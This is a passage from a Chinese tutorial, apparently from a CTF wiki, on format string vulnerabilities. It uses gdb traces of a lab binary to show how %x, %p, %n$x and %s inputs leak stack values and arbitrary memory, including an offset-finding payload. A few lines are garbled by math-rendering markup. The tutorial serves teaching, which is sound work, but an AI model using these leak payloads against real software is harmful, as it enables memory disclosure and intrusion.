<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">Breakpoint 1, __printf (format=0x8048563 &quot;%08x.%08x.%08x.%s\n&quot;) at printf.c:28<br>28	printf.c: 没有那个文件或目录.<br>────────────────────────────────────────────────[ code:i386 ]────<br>   0xf7e44667 &lt;fprintf+23&gt;     inc    DWORD PTR [ebx+0x66c31cc4]<br>   0xf7e4466d                  nop<br>   0xf7e4466e                  xchg   ax, ax<br> → 0xf7e44670 &lt;printf+0&gt;       call   0xf7f1ab09 &lt;__x86.get_pc_thunk.ax&gt;<br>   ↳  0xf7f1ab09 &lt;__x86.get_pc_thunk.ax+0&gt; mov    eax, DWORD PTR [esp]<br>      0xf7f1ab0c &lt;__x86.get_pc_thunk.ax+3&gt; ret<br>      0xf7f1ab0d &lt;__x86.get_pc_thunk.dx+0&gt; mov    edx, DWORD PTR [esp]<br>      0xf7f1ab10 &lt;__x86.get_pc_thunk.dx+3&gt; ret<br>──────────────────────────────────────────────[ stack ]────<br>[&#x27;0xffffccec&#x27;, &#x27;l8&#x27;]<br>8<br>0xffffccec│+0x00: 0x080484bf  →  &lt;main+84&gt; add esp, 0x20	 ← $esp<br>0xffffccf0│+0x04: 0x08048563  →  &quot;%08x.%08x.%08x.%s&quot;<br>0xffffccf4│+0x08: 0x00000001<br>0xffffccf8│+0x0c: 0x22222222<br>0xffffccfc│+0x10: 0xffffffff<br>0xffffcd00│+0x14: 0xffffcd10  →  &quot;%08x.%08x.%08x&quot;<br>0xffffcd04│+0x18: 0xffffcd10  →  &quot;%08x.%08x.%08x&quot;<br>0xffffcd08│+0x1c: 0x000000c2<br></code></pre></td></tr></table></figure>

<p>可以看出，此时此时已经进入了printf函数中，栈中第一个变量为返回地址，第二个变量为格式化字符串的地址，第三个变量为a的值，第四个变量为b的值，第五个变量为c的值，第六个变量为我们输入的格式化字符串对应的地址。继续运行程序</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">gef➤  c<br>Continuing.<br>00000001.22222222.ffffffff.%08x.%08x.%08x<br><br></code></pre></td></tr></table></figure>

<p>可以看出，程序确实输出了每一个变量对应的数值，并且断在了下一个printf处</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">Breakpoint 1, __printf (format=0xffffcd10 &quot;%08x.%08x.%08x&quot;) at printf.c:28<br>28	in printf.c<br>───────────────────────────────────────────────────────────────[ code:i386 ]────<br>   0xf7e44667 &lt;fprintf+23&gt;     inc    DWORD PTR [ebx+0x66c31cc4]<br>   0xf7e4466d                  nop<br>   0xf7e4466e                  xchg   ax, ax<br> → 0xf7e44670 &lt;printf+0&gt;       call   0xf7f1ab09 &lt;__x86.get_pc_thunk.ax&gt;<br>   ↳  0xf7f1ab09 &lt;__x86.get_pc_thunk.ax+0&gt; mov    eax, DWORD PTR [esp]<br>      0xf7f1ab0c &lt;__x86.get_pc_thunk.ax+3&gt; ret<br>      0xf7f1ab0d &lt;__x86.get_pc_thunk.dx+0&gt; mov    edx, DWORD PTR [esp]<br>      0xf7f1ab10 &lt;__x86.get_pc_thunk.dx+3&gt; ret<br>────────────────────────────────────────────────────────[ stack ]────<br>[&#x27;0xffffccfc&#x27;, &#x27;l8&#x27;]<br>8<br>0xffffccfc│+0x00: 0x080484ce  →  &lt;main+99&gt; add esp, 0x10	 ← $esp<br>0xffffcd00│+0x04: 0xffffcd10  →  &quot;%08x.%08x.%08x&quot;<br>0xffffcd04│+0x08: 0xffffcd10  →  &quot;%08x.%08x.%08x&quot;<br>0xffffcd08│+0x0c: 0x000000c2<br>0xffffcd0c│+0x10: 0xf7e8b6bb  →  &lt;handle_intel+107&gt; add esp, 0x10<br>0xffffcd10│+0x14: &quot;%08x.%08x.%08x&quot;	 ← $eax<br>0xffffcd14│+0x18: &quot;.%08x.%08x&quot;<br>0xffffcd18│+0x1c: &quot;x.%08x&quot;<br></code></pre></td></tr></table></figure>

<p>此时，由于格式化字符串为%x%x%x，所以，程序 会将栈上的0xffffcd04及其之后的数值分别作为第一，第二，第三个参数按照int型进行解析，分别输出。继续运行，我们可以得到如下结果去，确实和想象中的一样。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">gef➤  c<br>Continuing.<br>ffffcd10.000000c2.f7e8b6bb[Inferior 1 (process 57077) exited normally]<br></code></pre></td></tr></table></figure>

<p>当然，我们也可以使用%p来获取数据，如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">%p.%p.%p<br><span class="hljs-number">00000001.22222222</span>.ffffffff.%p.%p.%p<br><span class="hljs-number">0xfff328c0</span><span class="hljs-number">.0</span>xc2<span class="hljs-number">.0</span>xf75c46bb<br></code></pre></td></tr></table></figure>

<p>这里需要注意的是，并不是每次得到的结果都一样 ，因为栈上的数据会因为每次分配的内存页不同而有所不同，这是因为栈是不对内存页做初始化的。</p>
<p><strong>需要注意的是，我们上面给出的方法，都是依次获得栈中的每个参数，我们有没有办法直接获取呢</strong>？肯定是可以的啦。方法如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs text">%n$x<br></code></pre></td></tr></table></figure>

<p>利用如下的字符串，我们就可以获取到对应的第n+1个参数的数值。为什么这里要说是对应第n+1个参数呢？这是因为格式化参数里面的n指的是该格式化字符串对应的第n个输出参数，那相对于输出函数来说，就是第n+1个参数了。</p>
<p>这里我们再次以gdb调试一下。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">➜  leakmemory git:(master) ✗ gdb leakmemory<br>gef➤  b printf<br>Breakpoint 1 at 0x8048330<br>gef➤  r<br>Starting program: /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/leakmemory/leakmemory<br><span class="hljs-meta">%</span><span class="bash">3<span class="hljs-variable">$x</span></span><br><br>Breakpoint 1, __printf (format=0x8048563 &quot;%08x.%08x.%08x.%s\n&quot;) at printf.c:28<br>28	printf.c: 没有那个文件或目录.<br><br>─────────────────────────────────────────────────[ code:i386 ]────<br>   0xf7e44667 &lt;fprintf+23&gt;     inc    DWORD PTR [ebx+0x66c31cc4]<br>   0xf7e4466d                  nop<br>   0xf7e4466e                  xchg   ax, ax<br> → 0xf7e44670 &lt;printf+0&gt;       call   0xf7f1ab09 &lt;__x86.get_pc_thunk.ax&gt;<br>   ↳  0xf7f1ab09 &lt;__x86.get_pc_thunk.ax+0&gt; mov    eax, DWORD PTR [esp]<br>      0xf7f1ab0c &lt;__x86.get_pc_thunk.ax+3&gt; ret<br>      0xf7f1ab0d &lt;__x86.get_pc_thunk.dx+0&gt; mov    edx, DWORD PTR [esp]<br>      0xf7f1ab10 &lt;__x86.get_pc_thunk.dx+3&gt; ret<br>─────────────────────────────────────────────────────[ stack ]────<br>[&#x27;0xffffccec&#x27;, &#x27;l8&#x27;]<br>8<br>0xffffccec│+0x00: 0x080484bf  →  &lt;main+84&gt; add esp, 0x20	 ← $esp<br>0xffffccf0│+0x04: 0x08048563  →  &quot;%08x.%08x.%08x.%s&quot;<br>0xffffccf4│+0x08: 0x00000001<br>0xffffccf8│+0x0c: 0x22222222<br>0xffffccfc│+0x10: 0xffffffff<br>0xffffcd00│+0x14: 0xffffcd10  →  &quot;%3$x&quot;<br>0xffffcd04│+0x18: 0xffffcd10  →  &quot;%3$x&quot;<br>0xffffcd08│+0x1c: 0x000000c2<br>gef➤  c<br>Continuing.<br>00000001.22222222.ffffffff.%3$x<br><br>Breakpoint 1, __printf (format=0xffffcd10 &quot;%3$x&quot;) at printf.c:28<br>28	in printf.c<br>─────────────────────────────────────────────────────[ code:i386 ]────<br>   0xf7e44667 &lt;fprintf+23&gt;     inc    DWORD PTR [ebx+0x66c31cc4]<br>   0xf7e4466d                  nop<br>   0xf7e4466e                  xchg   ax, ax<br> → 0xf7e44670 &lt;printf+0&gt;       call   0xf7f1ab09 &lt;__x86.get_pc_thunk.ax&gt;<br>   ↳  0xf7f1ab09 &lt;__x86.get_pc_thunk.ax+0&gt; mov    eax, DWORD PTR [esp]<br>      0xf7f1ab0c &lt;__x86.get_pc_thunk.ax+3&gt; ret<br>      0xf7f1ab0d &lt;__x86.get_pc_thunk.dx+0&gt; mov    edx, DWORD PTR [esp]<br>      0xf7f1ab10 &lt;__x86.get_pc_thunk.dx+3&gt; ret<br>─────────────────────────────────────────────────────[ stack ]────<br>[&#x27;0xffffccfc&#x27;, &#x27;l8&#x27;]<br>8<br>0xffffccfc│+0x00: 0x080484ce  →  &lt;main+99&gt; add esp, 0x10	 ← $esp<br>0xffffcd00│+0x04: 0xffffcd10  →  &quot;%3$x&quot;<br>0xffffcd04│+0x08: 0xffffcd10  →  &quot;%3$x&quot;<br>0xffffcd08│+0x0c: 0x000000c2<br>0xffffcd0c│+0x10: 0xf7e8b6bb  →  &lt;handle_intel+107&gt; add esp, 0x10<br>0xffffcd10│+0x14: &quot;%3<svg xmlns:xlink="http://www.w3.org/1999/xlink" width="5.461ex" height="2.176ex" style="vertical-align: -0.338ex;" viewbox="0 -791.3 2351.3 936.9" role="img" focusable="false" xmlns="http://www.w3.org/2000/svg" aria-labelledby="MathJax-SVG-1-Title">
<title id="MathJax-SVG-1-Title">x"	 ← </title>
<defs aria-hidden="true">
<path stroke-width="1" id="E1-MJMATHI-78" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"/>
<path stroke-width="1" id="E1-MJMAIN-22" d="M34 634Q34 659 50 676T93 694Q121 694 144 668T168 579Q168 525 146 476T101 403T73 379Q69 379 60 388T50 401Q50 404 62 417T88 448T116 500T131 572Q131 584 130 584T125 581T112 576T94 573Q69 573 52 590T34 634ZM238 634Q238 659 254 676T297 694Q325 694 348 668T372 579Q372 525 350 476T305 403T277 379Q273 379 264 388T254 401Q254 404 266 417T292 448T320 500T335 572Q335 584 334 584T329 581T316 576T298 573Q273 573 256 590T238 634Z"/>
<path stroke-width="1" id="E1-MJMAIN-2190" d="M944 261T944 250T929 230H165Q167 228 182 216T211 189T244 152T277 96T303 25Q308 7 308 0Q308 -11 288 -11Q281 -11 278 -11T272 -7T267 2T263 21Q245 94 195 151T73 236Q58 242 55 247Q55 254 59 257T73 264Q121 283 158 314T215 375T247 434T264 480L267 497Q269 503 270 505T275 509T288 511Q308 511 308 500Q308 493 303 475Q293 438 278 406T246 352T215 315T185 287T165 270H929Q944 261 944 250Z"/>
</defs>
<g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)" aria-hidden="true">
 <use xlink:href="#E1-MJMATHI-78" x="0" y="0"/>
<g transform="translate(850,0)">
 <use xlink:href="#E1-MJMAIN-22"/>
 <use xlink:href="#E1-MJMAIN-2190" x="500" y="0"/>
</g>
</g>
</svg>eax<br>0xffffcd14│+0x18: 0xffffce00  →  0x00000001<br>0xffffcd18│+0x1c: 0x000000e0<br>gef➤  c<br>Continuing.<br>f7e8b6bb[Inferior 1 (process 57442) exited normally]<br></code></pre></td></tr></table></figure>

<p>可以看出，我们确实获得了printf的第4个参数所对应的值f7e8b6bb。</p>
<h4 id="获取栈变量对应字符串"><a href="#获取栈变量对应字符串" class="headerlink" title="获取栈变量对应字符串"></a>获取栈变量对应字符串</h4><p>此外，我们还可以获得栈变量对应的字符串，这其实就是需要用到%s了。这里还是使用上面的程序，进行gdb调试，如下</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">➜  leakmemory git:(master) ✗ gdb leakmemory<br>gef➤  b printf<br>Breakpoint 1 at 0x8048330<br>gef➤  r<br>Starting program: /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/leakmemory/leakmemory<br><span class="hljs-meta">%</span><span class="bash">s</span><br><br>Breakpoint 1, __printf (format=0x8048563 &quot;%08x.%08x.%08x.%s\n&quot;) at printf.c:28<br>28	printf.c: 没有那个文件或目录.<br>────────────────────────────────────────────────────────────────[ code:i386 ]────<br>   0xf7e44667 &lt;fprintf+23&gt;     inc    DWORD PTR [ebx+0x66c31cc4]<br>   0xf7e4466d                  nop<br>   0xf7e4466e                  xchg   ax, ax<br> → 0xf7e44670 &lt;printf+0&gt;       call   0xf7f1ab09 &lt;__x86.get_pc_thunk.ax&gt;<br>   ↳  0xf7f1ab09 &lt;__x86.get_pc_thunk.ax+0&gt; mov    eax, DWORD PTR [esp]<br>      0xf7f1ab0c &lt;__x86.get_pc_thunk.ax+3&gt; ret<br>      0xf7f1ab0d &lt;__x86.get_pc_thunk.dx+0&gt; mov    edx, DWORD PTR [esp]<br>      0xf7f1ab10 &lt;__x86.get_pc_thunk.dx+3&gt; ret<br>────────────────────────────────────────────────────────[ stack ]────<br>[&#x27;0xffffccec&#x27;, &#x27;l8&#x27;]<br>8<br>0xffffccec│+0x00: 0x080484bf  →  &lt;main+84&gt; add esp, 0x20	 ← $esp<br>0xffffccf0│+0x04: 0x08048563  →  &quot;%08x.%08x.%08x.%s&quot;<br>0xffffccf4│+0x08: 0x00000001<br>0xffffccf8│+0x0c: 0x22222222<br>0xffffccfc│+0x10: 0xffffffff<br>0xffffcd00│+0x14: 0xffffcd10  →  0xff007325 (&quot;%s&quot;?)<br>0xffffcd04│+0x18: 0xffffcd10  →  0xff007325 (&quot;%s&quot;?)<br>0xffffcd08│+0x1c: 0x000000c2<br>gef➤  c<br>Continuing.<br>00000001.22222222.ffffffff.%s<br><br>Breakpoint 1, __printf (format=0xffffcd10 &quot;%s&quot;) at printf.c:28<br>28	in printf.c<br>──────────────────────────────────────────────────────────[ code:i386 ]────<br>   0xf7e44667 &lt;fprintf+23&gt;     inc    DWORD PTR [ebx+0x66c31cc4]<br>   0xf7e4466d                  nop<br>   0xf7e4466e                  xchg   ax, ax<br> → 0xf7e44670 &lt;printf+0&gt;       call   0xf7f1ab09 &lt;__x86.get_pc_thunk.ax&gt;<br>   ↳  0xf7f1ab09 &lt;__x86.get_pc_thunk.ax+0&gt; mov    eax, DWORD PTR [esp]<br>      0xf7f1ab0c &lt;__x86.get_pc_thunk.ax+3&gt; ret<br>      0xf7f1ab0d &lt;__x86.get_pc_thunk.dx+0&gt; mov    edx, DWORD PTR [esp]<br>      0xf7f1ab10 &lt;__x86.get_pc_thunk.dx+3&gt; ret<br>──────────────────────────────────────────────────────────────[ stack ]────<br>[&#x27;0xffffccfc&#x27;, &#x27;l8&#x27;]<br>8<br>0xffffccfc│+0x00: 0x080484ce  →  &lt;main+99&gt; add esp, 0x10	 ← $esp<br>0xffffcd00│+0x04: 0xffffcd10  →  0xff007325 (&quot;%s&quot;?)<br>0xffffcd04│+0x08: 0xffffcd10  →  0xff007325 (&quot;%s&quot;?)<br>0xffffcd08│+0x0c: 0x000000c2<br>0xffffcd0c│+0x10: 0xf7e8b6bb  →  &lt;handle_intel+107&gt; add esp, 0x10<br>0xffffcd10│+0x14: 0xff007325 (&quot;%s&quot;?)	 ← $eax<br>0xffffcd14│+0x18: 0xffffce3c  →  0xffffd074  →  &quot;XDG_SEAT_PATH=/org/freedesktop/DisplayManager/Seat[...]&quot;<br>0xffffcd18│+0x1c: 0x000000e0<br>gef➤  c<br>Continuing.<br><span class="hljs-meta">%</span><span class="bash">s[Inferior 1 (process 57488) exited normally]</span><br></code></pre></td></tr></table></figure>

<p>可以看出，在第二次执行printf函数的时候，确实是将0xffffcd04处的变量视为字符串变量，输出了其数值所对应的地址处的字符串。</p>
<p><strong>当然，并不是所有这样的都会正常运行，如果对应的变量不能够被解析为字符串地址，那么，程序就会直接崩溃。</strong></p>
<p>此外，我们也可以指定获取栈上第几个参数作为格式化字符串输出，比如我们指定第printf的第3个参数，如下，此时程序就不能够解析，就崩溃了。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">➜  leakmemory git:(master) ✗ ./leakmemory<br><span class="hljs-meta">%</span><span class="bash">2<span class="hljs-variable">$s</span></span><br>00000001.22222222.ffffffff.%2$s<br>[1]    57534 segmentation fault (core dumped)  ./leakmemory<br></code></pre></td></tr></table></figure>

<p><strong>小技巧总结</strong></p>
<blockquote>
<ol>
<li>利用%x来获取对应栈的内存，但建议使用%p，可以不用考虑位数的区别。</li>
<li>利用%s来获取变量所对应地址的内容，只不过有零截断。</li>
<li>利用%order\<svg xmlns:xlink="http://www.w3.org/1999/xlink" width="27.33ex" height="3.343ex" style="vertical-align: -1.171ex;" viewbox="0 -934.9 11766.9 1439.2" role="img" focusable="false" xmlns="http://www.w3.org/2000/svg" aria-labelledby="MathJax-SVG-1-Title">
<title id="MathJax-SVG-1-Title">x来获取指定参数的值，利用%order\</title>
<defs aria-hidden="true">
<path stroke-width="1" id="E1-MJMATHI-78" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"/>
</defs>
<g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)" aria-hidden="true">
 <use xlink:href="#E1-MJMATHI-78" x="0" y="0"/>
<g transform="translate(572,0)">
<text font-family="monospace" stroke="none" transform="scale(71.759) matrix(1 0 0 -1 0 0)">来</text>
</g>
<g transform="translate(1505,0)">
<text font-family="monospace" stroke="none" transform="scale(71.759) matrix(1 0 0 -1 0 0)">获</text>
</g>
<g transform="translate(2438,0)">
<text font-family="monospace" stroke="none" transform="scale(71.759) matrix(1 0 0 -1 0 0)">取</text>
</g>
<g transform="translate(3371,0)">
<text font-family="monospace" stroke="none" transform="scale(71.759) matrix(1 0 0 -1 0 0)">指</text>
</g>
<g transform="translate(4303,0)">
<text font-family="monospace" stroke="none" transform="scale(71.759) matrix(1 0 0 -1 0 0)">定</text>
</g>
<g transform="translate(5236,0)">
<text font-family="monospace" stroke="none" transform="scale(71.759) matrix(1 0 0 -1 0 0)">参</text>
</g>
<g transform="translate(6169,0)">
<text font-family="monospace" stroke="none" transform="scale(71.759) matrix(1 0 0 -1 0 0)">数</text>
</g>
<g transform="translate(7102,0)">
<text font-family="monospace" stroke="none" transform="scale(71.759) matrix(1 0 0 -1 0 0)">的</text>
</g>
<g transform="translate(8035,0)">
<text font-family="monospace" stroke="none" transform="scale(71.759) matrix(1 0 0 -1 0 0)">值</text>
</g>
<g transform="translate(8968,0)">
<text font-family="monospace" stroke="none" transform="scale(71.759) matrix(1 0 0 -1 0 0)">，</text>
</g>
<g transform="translate(9901,0)">
<text font-family="monospace" stroke="none" transform="scale(71.759) matrix(1 0 0 -1 0 0)">利</text>
</g>
<g transform="translate(10834,0)">
<text font-family="monospace" stroke="none" transform="scale(71.759) matrix(1 0 0 -1 0 0)">用</text>
</g>
</g>
</svg>s来获取指定参数对应地址的内容。</li>
</ol>
</blockquote>
<h3 id="泄露任意地址内存"><a href="#泄露任意地址内存" class="headerlink" title="泄露任意地址内存"></a>泄露任意地址内存</h3><p>可以看出，在上面无论是泄露栈上连续的变量，还是说泄露指定的变量值，我们都没能完全控制我们所要泄露的变量的地址。这样的泄露固然有用，可是却不够强力有效。有时候，我们可能会想要泄露某一个libc函数的got表内容，从而得到其地址，进而获取libc版本以及其他函数的地址，这时候，能够完全控制泄露某个指定地址的内存就显得很重要了。那么我们究竟能不能这样做呢？自然也是可以的啦。</p>
<p>我们再仔细回想一下，一般来说，在格式化字符串漏洞中，我们所读取的格式化字符串都是在栈上的（因为是某个函数的局部变量，本例中s是main函数的局部变量）。那么也就是说，在调用输出函数的时候，其实，第一个参数的值其实就是该格式化字符串的地址。我们选择上面的某个函数调用为例</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">Breakpoint 1, __printf (format=0xffffcd10 &quot;%s&quot;) at printf.c:28<br>28	in printf.c<br>──────────────────────────────────────────────────────────[ code:i386 ]────<br>   0xf7e44667 &lt;fprintf+23&gt;     inc    DWORD PTR [ebx+0x66c31cc4]<br>   0xf7e4466d                  nop<br>   0xf7e4466e                  xchg   ax, ax<br> → 0xf7e44670 &lt;printf+0&gt;       call   0xf7f1ab09 &lt;__x86.get_pc_thunk.ax&gt;<br>   ↳  0xf7f1ab09 &lt;__x86.get_pc_thunk.ax+0&gt; mov    eax, DWORD PTR [esp]<br>      0xf7f1ab0c &lt;__x86.get_pc_thunk.ax+3&gt; ret<br>      0xf7f1ab0d &lt;__x86.get_pc_thunk.dx+0&gt; mov    edx, DWORD PTR [esp]<br>      0xf7f1ab10 &lt;__x86.get_pc_thunk.dx+3&gt; ret<br>──────────────────────────────────────────────────────────────[ stack ]────<br>[&#x27;0xffffccfc&#x27;, &#x27;l8&#x27;]<br>8<br>0xffffccfc│+0x00: 0x080484ce  →  &lt;main+99&gt; add esp, 0x10	 ← $esp<br>0xffffcd00│+0x04: 0xffffcd10  →  0xff007325 (&quot;%s&quot;?)<br>0xffffcd04│+0x08: 0xffffcd10  →  0xff007325 (&quot;%s&quot;?)<br>0xffffcd08│+0x0c: 0x000000c2<br>0xffffcd0c│+0x10: 0xf7e8b6bb  →  &lt;handle_intel+107&gt; add esp, 0x10<br>0xffffcd10│+0x14: 0xff007325 (&quot;%s&quot;?)	 ← $eax<br>0xffffcd14│+0x18: 0xffffce3c  →  0xffffd074  →  &quot;XDG_SEAT_PATH=/org/freedesktop/DisplayManager/Seat[...]&quot;<br>0xffffcd18│+0x1c: 0x000000e0<br></code></pre></td></tr></table></figure>

<p>可以看出在栈上的第二个变量就是我们的格式化字符串地址0xffffcd10，同时该地址存储的也确实是”%s”格式化字符串内容。</p>
<p>那么由于我们可以控制该格式化字符串，如果我们知道该格式化字符串在输出函数调用时是第几个参数，这里假设该格式化字符串相对函数调用为第k个参数。那我们就可以通过如下的方式来获取某个指定地址addr的内容。</p>
<figure class="highlight cos"><table><tr><td class="code"><pre><code class="hljs cos">addr<span class="hljs-built_in">%k</span><span class="hljs-built_in">$s</span><br></code></pre></td></tr></table></figure>

<blockquote>
<p>注： 在这里，如果格式化字符串在栈上，那么我们就一定确定格式化字符串的相对偏移，这是因为在函数调用的时候栈指针至少低于格式化字符串地址8字节或者16字节。</p>
</blockquote>
<p>下面就是如何确定该格式化字符串为第几个参数的问题了，我们可以通过如下方式确定</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs text">[tag]%p%p%p%p%p%p...<br></code></pre></td></tr></table></figure>

<p>一般来说，我们会重复某个字符的机器字长来作为tag，而后面会跟上若干个%p来输出栈上的内容，如果内容与我们前面的tag重复了，那么我们就可以有很大把握说明该地址就是格式化字符串的地址，之所以说是有很大把握，这是因为不排除栈上有一些临时变量也是该数值。一般情况下，极其少见，我们也可以更换其他字符进行尝试，进行再次确认。这里我们利用字符’A’作为特定字符，同时还是利用之前编译好的程序，如下</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">➜  leakmemory git:(master) ✗ ./leakmemory<br><span class="hljs-meta">AAAA%</span><span class="bash">p%p%p%p%p%p%p%p%p%p%p%p%p%p%p</span><br>00000001.22222222.ffffffff.AAAA%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p<br><span class="hljs-meta">AAAA0xffaab1600xc20xf76146bb0x414141410x702570250x702570250x702570250x702570250x702570250x702570250x702570250x70250xffaab2240xf77360000xaec7%</span><br></code></pre></td></tr></table></figure>

<p>由0x41414141处所在的位置可以看出我们的格式化字符串的起始地址正好是输出函数的第5个参数，但是是格式化字符串的第4个参数。我们可以来测试一下</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">➜  leakmemory git:(master) ✗ ./leakmemory<br><span class="hljs-meta">%</span><span class="bash">4<span class="hljs-variable">$s</span></span><br>00000001.22222222.ffffffff.%4$s<br>[1]    61439 segmentation fault (core dumped)  ./leakmemory<br></code></pre></td></tr></table></figure>

<p>可以看出，我们的程序崩溃了，为什么呢？这是因为我们试图将该格式化字符串所对应的值作为地址进行解析，但是显然该值没有办法作为一个合法的地址被解析，，所以程序就崩溃了。具体的可以参考下面的调试。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell"> → 0xf7e44670 &lt;printf+0&gt;       call   0xf7f1ab09 &lt;__x86.get_pc_thunk.ax&gt;<br>   ↳  0xf7f1ab09 &lt;__x86.get_pc_thunk.ax+0&gt; mov    eax, DWORD PTR [esp]<br>      0xf7f1ab0c &lt;__x86.get_pc_thunk.ax+3&gt; ret<br>      0xf7f1ab0d &lt;__x86.get_pc_thunk.dx+0&gt; mov    edx, DWORD PTR [esp]<br>      0xf7f1ab10 &lt;__x86.get_pc_thunk.dx+3&gt; ret<br>───────────────────────────────────────────────────────────────────[ stack ]────<br>[&#x27;0xffffcd0c&#x27;, &#x27;l8&#x27;]<br>8<br>0xffffcd0c│+0x00: 0x080484ce  →  &lt;main+99&gt; add esp, 0x10	 ← $esp<br>0xffffcd10│+0x04: 0xffffcd20  →  &quot;%4$s&quot;<br>0xffffcd14│+0x08: 0xffffcd20  →  &quot;%4$s&quot;<br>0xffffcd18│+0x0c: 0x000000c2<br>0xffffcd1c│+0x10: 0xf7e8b6bb  →  &lt;handle_intel+107&gt; add esp, 0x10<br>0xffffcd20│+0x14: &quot;%4<svg xmlns:xlink="http://www.w3.org/1999/xlink" width="5.222ex" height="2.176ex" style="vertical-align: -0.338ex;" viewbox="0 -791.3 2248.3 936.9" role="img" focusable="false" xmlns="http://www.w3.org/2000/svg" aria-labelledby="MathJax-SVG-1-Title">
<title id="MathJax-SVG-1-Title">s"	 ← </title>
<defs aria-hidden="true">
<path stroke-width="1" id="E1-MJMATHI-73" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z"/>
<path stroke-width="1" id="E1-MJMAIN-22" d="M34 634Q34 659 50 676T93 694Q121 694 144 668T168 579Q168 525 146 476T101 403T73 379Q69 379 60 388T50 401Q50 404 62 417T88 448T116 500T131 572Q131 584 130 584T125 581T112 576T94 573Q69 573 52 590T34 634ZM238 634Q238 659 254 676T297 694Q325 694 348 668T372 579Q372 525 350 476T305 403T277 379Q273 379 264 388T254 401Q254 404 266 417T292 448T320 500T335 572Q335 584 334 584T329 581T316 576T298 573Q273 573 256 590T238 634Z"/>
<path stroke-width="1" id="E1-MJMAIN-2190" d="M944 261T944 250T929 230H165Q167 228 182 216T211 189T244 152T277 96T303 25Q308 7 308 0Q308 -11 288 -11Q281 -11 278 -11T272 -7T267 2T263 21Q245 94 195 151T73 236Q58 242 55 247Q55 254 59 257T73 264Q121 283 158 314T215 375T247 434T264 480L267 497Q269 503 270 505T275 509T288 511Q308 511 308 500Q308 493 303 475Q293 438 278 406T246 352T215 315T185 287T165 270H929Q944 261 944 250Z"/>
</defs>
<g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)" aria-hidden="true">
 <use xlink:href="#E1-MJMATHI-73" x="0" y="0"/>
<g transform="translate(747,0)">
 <use xlink:href="#E1-MJMAIN-22"/>
 <use xlink:href="#E1-MJMAIN-2190" x="500" y="0"/>
</g>
</g>
</svg>eax<br>0xffffcd24│+0x18: 0xffffce00  →  0x00000000<br>0xffffcd28│+0x1c: 0x000000e0<br>───────────────────────────────────────────────────────────────────[ trace ]────<br><span class="hljs-meta">[#</span><span class="bash">0] 0xf7e44670 → Name: __printf(format=0xffffcd20 <span class="hljs-string">&quot;%4<span class="hljs-variable">$s</span>&quot;</span>)</span><br><span class="hljs-meta">[#</span><span class="bash">1] 0x80484ce → Name: main()</span><br>────────────────────────────────────────────────────────────────────────────────<br>gef➤  help x/<br>Examine memory: x/FMT ADDRESS.<br>ADDRESS is an expression for the memory address to examine.<br>FMT is a repeat count followed by a format letter and a size letter.<br>Format letters are o(octal), x(hex), d(decimal), u(unsigned decimal),<br>  t(binary), f(float), a(address), i(instruction), c(char), s(string)<br>  and z(hex, zero padded on the left).<br>Size letters are b(byte), h(halfword), w(word), g(giant, 8 bytes).<br>The specified number of objects of the specified size are printed<br>according to the format.<br><br>Defaults for format and size letters are those previously used.<br>Default count is 1.  Default address is following last thing printed<br>with this command or 